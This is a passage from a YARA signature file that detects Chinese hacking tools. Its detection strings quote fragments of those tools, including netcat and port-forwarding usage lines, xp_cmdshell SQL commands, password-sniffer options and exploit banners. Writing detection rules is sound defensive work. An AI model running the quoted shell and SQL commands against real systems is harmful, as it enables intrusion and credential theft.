		description = "Chinese Hacktool Set - file look.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e1a37f31170e812185cf00a838835ee59b8f64ba"
	strings:
		$s1 = "<description>CHKen QQ:41901298</description>" fullword ascii
		$s2 = "version=\"9.9.9.9\"" fullword ascii
		$s3 = "name=\"CH.Ken.Tool\"" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 40KB and all of them
}

rule NtGodMode {
	meta:
		description = "Chinese Hacktool Set - file NtGodMode.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "8baac735e37523d28fdb6e736d03c67274f7db77"
	strings:
		$s0 = "to HOST!" fullword ascii
		$s1 = "SS.EXE" fullword ascii
		$s5 = "lstrlen0" fullword ascii
		$s6 = "Virtual" fullword ascii  /* Goodware String - occured 6 times */
		$s19 = "RtlUnw" fullword ascii /* Goodware String - occured 1 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 45KB and all of them
}

rule Dos_NC {
	meta:
		description = "Chinese Hacktool Set - file NC.EXE"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "57f0839433234285cc9df96198a6ca58248a4707"
	strings:
		$s1 = "nc -l -p port [options] [hostname] [port]" fullword ascii
		$s2 = "invalid connection to [%s] from %s [%s] %d" fullword ascii
		$s3 = "post-rcv getsockname failed" fullword ascii
		$s4 = "Failed to execute shell, error = %s" fullword ascii
		$s5 = "UDP listen needs -p arg" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 290KB and all of them
}

rule WebCrack4_RouterPasswordCracking {
	meta:
		description = "Chinese Hacktool Set - file WebCrack4-RouterPasswordCracking.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "00c68d1b1aa655dfd5bb693c13cdda9dbd34c638"
	strings:
		$s0 = "http://www.site.com/test.dll?user=%USERNAME&pass=%PASSWORD" fullword ascii
		$s1 = "Username: \"%s\", Password: \"%s\", Remarks: \"%s\"" fullword ascii
		$s14 = "user:\"%s\" pass: \"%s\" result=\"%s\"" fullword ascii
		$s16 = "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)" fullword ascii
		$s20 = "List count out of bounds (%d)+Operation not allowed on sorted string list%String" wide
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and 2 of them
}

rule hscan_gui {
	meta:
		description = "Chinese Hacktool Set - file hscan-gui.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "1885f0b7be87f51c304b39bc04b9423539825c69"
	strings:
		$s0 = "Hscan.EXE" fullword wide
		$s1 = "RestTool.EXE" fullword ascii
		$s3 = "Hscan Application " fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 550KB and all of them
}

rule S_MultiFunction_Scanners_s {
	meta:
		description = "Chinese Hacktool Set - file s.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "79b60ffa1c0f73b3c47e72118e0f600fcd86b355"
	strings:
		$s0 = "C:\\WINDOWS\\temp\\pojie.exe /l=" fullword ascii
		$s1 = "C:\\WINDOWS\\temp\\s.exe" fullword ascii
		$s2 = "C:\\WINDOWS\\temp\\s.exe tcp " fullword ascii
		$s3 = "explorer.exe http://www.hackdos.com" fullword ascii
		$s4 = "C:\\WINDOWS\\temp\\pojie.exe" fullword ascii
		$s5 = "Failed to read file or invalid data in file!" fullword ascii
		$s6 = "www.hackdos.com" fullword ascii
		$s7 = "WTNE / MADE BY E COMPILER - WUTAO " fullword ascii
		$s11 = "The interface of kernel library is invalid!" fullword ascii
		$s12 = "eventvwr" fullword ascii
		$s13 = "Failed to decompress data!" fullword ascii
		$s14 = "NOTEPAD.EXE result.txt" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 8000KB and 4 of them
}

rule Dos_GetPass {
	meta:
		description = "Chinese Hacktool Set - file GetPass.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "d18d952b24110b83abd17e042f9deee679de6a1a"
	strings:
		$s0 = "GetLogonS" ascii
		$s3 = "/showthread.php?t=156643" ascii
		$s8 = "To Run As Administ" ascii
		$s18 = "EnableDebugPrivileg" fullword ascii
		$s19 = "sedebugnameValue" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 890KB and all of them
}

rule update_PcMain {
	meta:
		description = "Chinese Hacktool Set - file PcMain.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "aa68323aaec0269b0f7e697e69cce4d00a949caa"
	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322" ascii
		$s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost" fullword ascii
		$s2 = "SOFTWARE\\Classes\\HTTP\\shell\\open\\command" fullword ascii
		$s3 = "\\svchost.exe -k " fullword ascii
		$s4 = "SYSTEM\\ControlSet001\\Services\\%s" fullword ascii
		$s9 = "Global\\%s-key-event" fullword ascii
		$s10 = "%d%d.exe" fullword ascii
		$s14 = "%d.exe" fullword ascii
		$s15 = "Global\\%s-key-metux" fullword ascii
		$s18 = "GET / HTTP/1.1" fullword ascii
		$s19 = "\\Services\\" fullword ascii
		$s20 = "qy001id=%d;qy001guid=%s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 4 of them
}

rule Dos_sys {
	meta:
		description = "Chinese Hacktool Set - file sys.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b5837047443f8bc62284a0045982aaae8bab6f18"
	strings:
		$s0 = "'SeDebugPrivilegeOpen " fullword ascii
		$s6 = "Author: Cyg07*2" fullword ascii
		$s12 = "from golds7n[LAG]'J" fullword ascii
		$s14 = "DAMAGE" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and all of them
}

rule dat_xpf {
	meta:
		description = "Chinese Hacktool Set - file xpf.sys"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "761125ab594f8dc996da4ce8ce50deba49c81846"
	strings:
		$s1 = "UnHook IoGetDeviceObjectPointer ok!" fullword ascii
		$s2 = "\\Device\\XScanPF" fullword wide
		$s3 = "\\DosDevices\\XScanPF" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 25KB and all of them
}

rule Project1 {
	meta:
		description = "Chinese Hacktool Set - file Project1.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "d1a5e3b646a16a7fcccf03759bd0f96480111c96"
	strings:
		$s1 = "EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll'" fullword ascii
		$s2 = "Password.txt" fullword ascii
		$s3 = "LoginPrompt" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and all of them
}

rule Arp_EMP_v1_0 {
	meta:
		description = "Chinese Hacktool Set - file Arp EMP v1.0.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ae4954c142ad1552a2abaef5636c7ef68fdd99ee"
	strings:
		$s0 = "Arp EMP v1.0.exe" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and all of them
}

rule CN_Tools_MyUPnP {
	meta:
		description = "Chinese Hacktool Set - file MyUPnP.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "15b6fca7e42cd2800ba82c739552e7ffee967000"
	strings:
		$s1 = "<description>BYTELINKER.COM</description>" fullword ascii
		$s2 = "myupnp.exe" fullword ascii
		$s3 = "LOADER ERROR" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1500KB and all of them
}

rule CN_Tools_Shiell {
	meta:
		description = "Chinese Hacktool Set - file Shiell.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b432d80c37abe354d344b949c8730929d8f9817a"
	strings:
		$s1 = "C:\\Users\\Tong\\Documents\\Visual Studio 2012\\Projects\\Shift shell" ascii
		$s2 = "C:\\Windows\\System32\\Shiell.exe" fullword wide
		$s3 = "Shift shell.exe" fullword wide
		$s4 = "\" /v debugger /t REG_SZ /d \"" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1500KB and 2 of them
}

rule cndcom_cndcom {
	meta:
		description = "Chinese Hacktool Set - file cndcom.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "08bbe6312342b28b43201125bd8c518531de8082"
	strings:
		$s1 = "- Rewritten by HDM last <hdm [at] metasploit.com>" fullword ascii
		$s2 = "- Usage: %s <Target ID> <Target IP>" fullword ascii
		$s3 = "- Remote DCOM RPC Buffer Overflow Exploit" fullword ascii
		$s4 = "- Warning:This Code is more like a dos tool!(Modify by pingker)" fullword ascii
		$s5 = "Windows NT SP6 (Chinese)" fullword ascii
		$s6 = "- Original code by FlashSky and Benjurry" fullword ascii
		$s7 = "\\C$\\123456111111111111111.doc" fullword wide
		$s8 = "shell3all.c" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule IsDebug_V1_4 {
	meta:
		description = "Chinese Hacktool Set - file IsDebug V1.4.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ca32474c358b4402421ece1cb31714fbb088b69a"
	strings:
		$s0 = "IsDebug.dll" fullword ascii
		$s1 = "SV Dumper V1.0" fullword wide
		$s2 = "(IsDebuggerPresent byte Patcher)" fullword ascii
		$s8 = "Error WriteMemory failed" fullword ascii
		$s9 = "IsDebugPresent" fullword ascii
		$s10 = "idb_Autoload" fullword ascii
		$s11 = "Bin Files" fullword ascii
		$s12 = "MASM32 version" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 30KB and all of them
}

rule HTTPSCANNER {
	meta:
		description = "Chinese Hacktool Set - file HTTPSCANNER.EXE"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ae2929346944c1ea3411a4562e9d5e2f765d088a"
	strings:
		$s1 = "HttpScanner.exe" fullword wide
		$s2 = "HttpScanner" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 3500KB and all of them
}

rule HScan_v1_20_PipeCmd_and_xCmd {
	meta:
		description = "Chinese Hacktool Set - file PipeCmd.exe / xCmd.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "64403ce63b28b544646a30da3be2f395788542d6"
	strings:
		$s1 = "%SystemRoot%\\system32\\PipeCmdSrv.exe" fullword ascii
		$s2 = "PipeCmd.exe" fullword wide
		$s3 = "Please Use NTCmd.exe Run This Program." fullword ascii
		$s4 = "%s\\pipe\\%s%s%d" fullword ascii
		$s5 = "\\\\.\\pipe\\%s%s%d" fullword ascii
		$s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
		$s7 = "This is a service executable! Couldn't start directly." fullword ascii
		$s8 = "Connecting to Remote Server ...Failed" fullword ascii
		$s9 = "PIPECMDSRV" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 4 of them
}

rule Dos_fp {
	meta:
		description = "Chinese Hacktool Set - file fp.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
	strings:
		$s1 = "fpipe -l 53 -s 53 -r 80 192.168.1.101" fullword ascii
		$s2 = "FPipe.exe" fullword wide
		$s3 = "http://www.foundstone.com" fullword ascii
		$s4 = "%s %s port %d. Address is already in use" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 65KB and all of them
}

rule CN_Tools_xsniff {
	meta:
		description = "Chinese Hacktool Set - file xsniff.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "d61d7329ac74f66245a92c4505a327c85875c577"
	strings:
		$s0 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
		$s1 = "HOST: %s USER: %s, PASS: %s" fullword ascii
		$s2 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
		$s10 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s11 = "%-5s%s->%s Bytes=%d TTL=%d Type: %d,%d ID=%d SEQ=%d" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 220KB and 2 of them
}

rule MSSqlPass {
	meta:
		description = "Chinese Hacktool Set - file MSSqlPass.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "172b4e31ed15d1275ac07f3acbf499daf9a055d7"
	strings:
		$s0 = "Reveals the passwords stored in the Registry by Enterprise Manager of SQL Server" wide
		$s1 = "empv.exe" fullword wide
		$s2 = "Enterprise Manager PassView" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 120KB and all of them
}

rule WSockExpert {
	meta:
		description = "Chinese Hacktool Set - file WSockExpert.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "2962bf7b0883ceda5e14b8dad86742f95b50f7bf"
	strings:
		$s1 = "OpenProcessCmdExecute!" fullword ascii
		$s2 = "http://www.hackp.com" fullword ascii
		$s3 = "'%s' is not a valid time!'%s' is not a valid date and time" fullword wide
		$s4 = "SaveSelectedFilterCmdExecute" fullword ascii
		$s5 = "PasswordChar@" fullword ascii
		$s6 = "WSockHook.DLL" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2500KB and 4 of them
}

rule Ms_Viru_racle {
	meta:
		description = "Chinese Hacktool Set - file racle.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "13116078fff5c87b56179c5438f008caf6c98ecb"
	strings:
		$s0 = "PsInitialSystemProcess @%p" fullword ascii
		$s1 = "PsLookupProcessByProcessId(%u) Failed" fullword ascii
		$s2 = "PsLookupProcessByProcessId(%u) => %p" fullword ascii
		$s3 = "FirstStage() Loaded, CurrentThread @%p Stack %p - %p" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 210KB and all of them
}

rule lamescan3 {
	meta:
		description = "Chinese Hacktool Set - file lamescan3.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "3130eefb79650dab2e323328b905e4d5d3a1d2f0"
	strings:
		$s1 = "dic\\loginlist.txt" fullword ascii
		$s2 = "Radmin.exe" fullword ascii
		$s3 = "lamescan3.pdf!" fullword ascii
		$s4 = "dic\\passlist.txt" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3740KB and all of them
}

rule CN_Tools_pc {
	meta:
		description = "Chinese Hacktool Set - file pc.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5cf8caba170ec461c44394f4058669d225a94285"
	strings:
		$s0 = "\\svchost.exe" fullword ascii
		$s2 = "%s%08x.001" fullword ascii
		$s3 = "Qy001Service" fullword ascii
		$s4 = "/.MIKY" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule Dos_Down64 {
	meta:
		description = "Chinese Hacktool Set - file Down64.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "43e455e43b49b953e17a5b885ffdcdf8b6b23226"
	strings:
		$s1 = "C:\\Windows\\Temp\\Down.txt" fullword wide
		$s2 = "C:\\Windows\\Temp\\Cmd.txt" fullword wide
		$s3 = "C:\\Windows\\Temp\\" fullword wide
		$s4 = "ProcessXElement" fullword ascii
		$s8 = "down.exe" fullword wide
		$s20 = "set_Timer1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and all of them
}

rule epathobj_exp32 {
	meta:
		description = "Chinese Hacktool Set - file epathobj_exp32.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ed86ff44bddcfdd630ade8ced39b4559316195ba"
	strings:
		$s0 = "Watchdog thread %d waiting on Mutex" fullword ascii
		$s1 = "Exploit ok run command" fullword ascii
		$s2 = "\\epathobj_exp\\Release\\epathobj_exp.pdb" fullword ascii
		$s3 = "Alllocated userspace PATHRECORD () %p" fullword ascii
		$s4 = "Mutex object did not timeout, list not patched" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 270KB and all of them
}

rule Tools_unknown {
	meta:
		description = "Chinese Hacktool Set - file unknown.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "4be8270c4faa1827177e2310a00af2d5bcd2a59f"
	strings:
		$s1 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
		$s2 = "GET /ok.asp?id=1__sql__ HTTP/1.1" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* PEStudio Blacklist: agent */
		$s4 = "Failed to clear tab control Failed to delete tab at index %d\"Failed to retrieve" wide
		$s5 = "Host: 127.0.0.1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2500KB and 4 of them
}

rule PLUGIN_AJunk {
	meta:
		description = "Chinese Hacktool Set - file AJunk.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "eb430fcfe6d13b14ff6baa4b3f59817c0facec00"
	strings:
		$s1 = "AJunk.dll" fullword ascii
		$s2 = "AJunk.DLL" fullword wide
		$s3 = "AJunk Dynamic Link Library" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 560KB and all of them
}

rule IISPutScanner {
	meta:
		description = "Chinese Hacktool Set - file IISPutScanner.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "9869c70d6a9ec2312c749aa17d4da362fa6e2592"
	strings:
		$s2 = "KERNEL32.DLL" fullword ascii
		$s3 = "ADVAPI32.DLL" fullword ascii
		$s4 = "VERSION.DLL" fullword ascii
		$s5 = "WSOCK32.DLL" fullword ascii
		$s6 = "COMCTL32.DLL" fullword ascii
		$s7 = "GDI32.DLL" fullword ascii
		$s8 = "SHELL32.DLL" fullword ascii
		$s9 = "USER32.DLL" fullword ascii
		$s10 = "OLEAUT32.DLL" fullword ascii
		$s11 = "LoadLibraryA" fullword ascii
		$s12 = "GetProcAddress" fullword ascii
		$s13 = "VirtualProtect" fullword ascii
		$s14 = "VirtualAlloc" fullword ascii
		$s15 = "VirtualFree" fullword ascii
		$s16 = "ExitProcess" fullword ascii
		$s17 = "RegCloseKey" fullword ascii
		$s18 = "GetFileVersionInfoA" fullword ascii
		$s19 = "ImageList_Add" fullword ascii
		$s20 = "BitBlt" fullword ascii
		$s21 = "ShellExecuteA" fullword ascii
		$s22 = "ActivateKeyboardLayout" fullword ascii
		$s23 = "BBABORT" fullword wide
		$s25 = "BBCANCEL" fullword wide
		$s26 = "BBCLOSE" fullword wide
		$s27 = "BBHELP" fullword wide
		$s28 = "BBIGNORE" fullword wide
		$s29 = "PREVIEWGLYPH" fullword wide
		$s30 = "DLGTEMPLATE" fullword wide
		$s31 = "TABOUTBOX" fullword wide
		$s32 = "TFORM1" fullword wide
		$s33 = "MAINICON" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and filesize > 350KB and all of them
}

rule IDTools_For_WinXP_IdtTool_2 {
	meta:
		description = "Chinese Hacktool Set - file IdtTool.sys"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "07feb31dd21d6f97614118b8a0adf231f8541a67"
	strings:
		$s0 = "\\Device\\devIdtTool" fullword wide
		$s1 = "IoDeleteSymbolicLink" fullword ascii  /* Goodware String - occured 467 times */
		$s3 = "IoDeleteDevice" fullword ascii  /* Goodware String - occured 993 times */
		$s6 = "IoCreateSymbolicLink" fullword ascii /* Goodware String - occured 467 times */
		$s7 = "IoCreateDevice" fullword ascii /* Goodware String - occured 988 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 7KB and all of them
}

rule hkmjjiis6 {
	meta:
		description = "Chinese Hacktool Set - file hkmjjiis6.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "4cbc6344c6712fa819683a4bd7b53f78ea4047d7"
	strings:
		$s1 = "comspec" fullword ascii
		$s2 = "user32.dlly" ascii
		$s3 = "runtime error" ascii
		$s4 = "WinSta0\\Defau" ascii
		$s5 = "AppIDFlags" fullword ascii
		$s6 = "GetLag" fullword ascii
		$s7 = "* FROM IIsWebInfo" ascii
		$s8 = "wmiprvse.exe" ascii
		$s9 = "LookupAcc" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 70KB and all of them
}

rule Dos_lcx {
	meta:
		description = "Chinese Hacktool Set - file lcx.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b6ad5dd13592160d9f052bb47b0d6a87b80a406d"
	strings:
		$s0 = "c:\\Users\\careful_snow\\" ascii
		$s1 = "Desktop\\Htran\\Release\\Htran.pdb" ascii
		$s3 = "[SERVER]connection to %s:%d error" fullword ascii
		$s4 = "-tran  <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
		$s6 = "=========== Code by lion & bkbll, Welcome to [url]http://www.cnhonker.com[/url] " ascii
		$s7 = "[-] There is a error...Create a new connection." fullword ascii
		$s8 = "[+] Accept a Client on port %d from %s" fullword ascii
		$s11 = "-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
		$s13 = "[+] Make a Connection to %s:%d...." fullword ascii
		$s16 = "-listen <ConnectPort> <TransmitPort>" fullword ascii
		$s17 = "[+] Waiting another Client on port:%d...." fullword ascii
		$s18 = "[+] Accept a Client on port %d from %s ......" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule x_way2_5_X_way {
	meta:
		description = "Chinese Hacktool Set - file X-way.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "8ba8530fbda3e8342e8d4feabbf98c66a322dac6"
	strings:
		$s0 = "TTFTPSERVERFRM" fullword wide
		$s1 = "TPORTSCANSETFRM" fullword wide
		$s2 = "TIISSHELLFRM" fullword wide
		$s3 = "TADVSCANSETFRM" fullword wide
		$s4 = "ntwdblib.dll" fullword ascii
		$s5 = "TSNIFFERFRM" fullword wide
		$s6 = "TCRACKSETFRM" fullword wide
		$s7 = "TCRACKFRM" fullword wide
		$s8 = "dbnextrow" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 5 of them
}

rule tools_Sqlcmd {
	meta:
		description = "Chinese Hacktool Set - file Sqlcmd.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "99d56476e539750c599f76391d717c51c4955a33"
	strings:
		$s0 = "[Usage]:  %s <HostName|IP> <UserName> <Password>" fullword ascii
		$s1 = "=============By uhhuhy(Feb 18,2003) - http://www.cnhonker.net=============" fullword ascii /* PEStudio Blacklist: os */
		$s4 = "Cool! Connected to SQL server on %s successfully!" fullword ascii
		$s5 = "EXEC master..xp_cmdshell \"%s\"" fullword ascii
		$s6 = "=======================Sqlcmd v0.21 For HScan v1.20=======================" fullword ascii
		$s10 = "Error,exit!" fullword ascii
		$s11 = "Sqlcmd>" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 40KB and 3 of them
}

rule Sword1_5 {
	meta:
		description = "Chinese Hacktool Set - file Sword1.5.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "96ee5c98e982aa8ed92cb4cedb85c7fda873740f"
	strings:
		$s3 = "http://www.ip138.com/ip2city.asp" fullword wide
		$s4 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
		$s6 = "ListBox_Command" fullword wide
		$s13 = "md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack" fullword wide
		$s18 = "\\Set.ini" fullword wide
		$s19 = "OpenFileDialog1" fullword wide
		$s20 = " (*.txt)|*.txt" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and 4 of them
}

rule Tools_scan {
	meta:
		description = "Chinese Hacktool Set - file scan.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "c580a0cc41997e840d2c0f83962e7f8b636a5a13"
	strings:
		$s2 = "Shanlu Studio" fullword wide
		$s3 = "_AutoAttackMain" fullword ascii
		$s4 = "_frmIpToAddr" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule Dos_c {
	meta:
		description = "Chinese Hacktool Set - file c.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "3deb6bd52fdac6d5a3e9a91c585d67820ab4df78"
	strings:
		$s0 = "!Win32 .EXE." fullword ascii
		$s1 = ".MPRESS1" fullword ascii
		$s2 = ".MPRESS2" fullword ascii
		$s3 = "XOLEHLP.dll" fullword ascii
		$s4 = "</body></html>" fullword ascii
		$s8 = "DtcGetTransactionManagerExA" fullword ascii  /* Goodware String - occured 12 times */
		$s9 = "GetUserNameA" fullword ascii  /* Goodware String - occured 305 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule arpsniffer {
	meta:
		description = "Chinese Hacktool Set - file arpsniffer.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "7d8753f56fc48413fc68102cff34b6583cb0066c"
	strings:
		$s1 = "SHELL" ascii
		$s2 = "PacketSendPacket" fullword ascii
		$s3 = "ArpSniff" ascii
		$s4 = "pcap_loop" fullword ascii  /* Goodware String - occured 3 times */
		$s5 = "packet.dll" fullword ascii  /* Goodware String - occured 4 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 120KB and all of them
}

rule pw_inspector_2 {
	meta:
		description = "Chinese Hacktool Set - file pw-inspector.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e0a1117ee4a29bb4cf43e3a80fb9eaa63bb377bf"
	strings:
		$s1 = "Use for hacking: trim your dictionary file to the pw requirements of the target." fullword ascii
		$s2 = "Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p " ascii
		$s3 = "PW-Inspector" fullword ascii
		$s4 = "i:o:m:M:c:lunps" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule datPcShare {
	meta:
		description = "Chinese Hacktool Set - file datPcShare.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "87acb649ab0d33c62e27ea83241caa43144fc1c4"
	strings:
		$s1 = "PcShare.EXE" fullword wide
		$s2 = "MZKERNEL32.DLL" fullword ascii
		$s3 = "PcShare" fullword wide
		$s4 = "QQ:4564405" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and all of them
}

rule Tools_xport {
	meta:
		description = "Chinese Hacktool Set - file xport.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "9584de562e7f8185f721e94ee3cceac60db26dda"
	strings:
		$s1 = "Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)" fullword ascii
		$s2 = "Example: xport www.xxx.com 80 -m syn" fullword ascii
		$s3 = "%s - command line port scanner" fullword ascii
		$s4 = "xport 192.168.1.1 1-1024 -t 200 -v" fullword ascii
		$s5 = "Usage: xport <Host> <Ports Scope> [Options]" fullword ascii
		$s6 = ".\\port.ini" fullword ascii
		$s7 = "Port scan complete, total %d port, %d port is opened, use %d ms." fullword ascii
		$s8 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s9 = "http://www.xfocus.org" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule Pc_xai {
	meta:
		description = "Chinese Hacktool Set - file xai.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "f285a59fd931ce137c08bd1f0dae858cc2486491"
	strings:
		$s1 = "Powered by CoolDiyer @ C.Rufus Security Team 05/19/2008  http://www.xcodez.com/" fullword wide
		$s2 = "%SystemRoot%\\System32\\" fullword ascii
		$s3 = "%APPDATA%\\" fullword ascii
		$s4 = "---- C.Rufus Security Team ----" fullword wide
		$s5 = "www.snzzkz.com" fullword wide
		$s6 = "%CommonProgramFiles%\\" fullword ascii
		$s7 = "GetRand.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule Radmin_Hash {
	meta:
		description = "Chinese Hacktool Set - file Radmin_Hash.exe"
		author = "Florian Roth"
		score = 70
